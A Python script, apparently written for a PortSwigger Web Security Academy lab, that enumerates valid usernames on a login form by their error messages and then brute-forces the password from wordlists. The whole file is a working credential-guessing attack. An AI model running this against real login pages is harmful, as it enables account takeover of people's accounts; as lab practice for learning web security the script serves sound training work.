import requests
import json


#DECLARATION OF STATIC VARIABLES
url="https://0ac200af04c8c04281427593007e0044.web-security-academy.net/login"
username_file="usuarios_noborrar.txt"
password_file="passwords_db.txt"

#function to upload users/passwords
def load_file(file):
    try:
        with open(file,"r") as final_file:
            lines=[]
            for line in final_file.readlines():
                lines.append(line.strip())
            return lines
    except FileNotFoundError:
        print(f"the file {file} could not be found")
        return []

#function to brute force post requests
def bruteforce_login(url,usernames,passwords):
    #final variables to return
    final_username=""
    final_password=""
    #loop to find username
    for username in usernames:
            data={"username":username,"password":"asdw"}
            try:
                #HTTP REQUEST
                response=requests.post(url,data=data)
                #is invalid username is in the respose, continues else breaks the loop
                if "Invalid username" in response.text:
                    print(f"[-] Invalid username: {username}")
                else:
                    print("valid user found {username}")
                    final_username=username
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error en la solicitud: {e}")
    #loop to find password
    for password in passwords:
            data={"username":final_username,"password":password}
            try:
                #HTTP REQUEST
                response=requests.post(url,data=data)
                #is incorrect password is in the respose, continues else breaks the loop
                if "Incorrect password" in response.text:
                    print(f"[-] Invalid password: {password}")
                else:
                    print("valid password found {password}")
                    final_password=password
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error en la solicitud: {e}")
    #PRINT THE CREDENTIALS FOUND
    print("username found ",final_username," password  found", final_password)

#creation of list whith words list    
usernames=load_file(username_file)
passwords=load_file(password_file)

#main function
bruteforce_login(url,usernames,passwords)
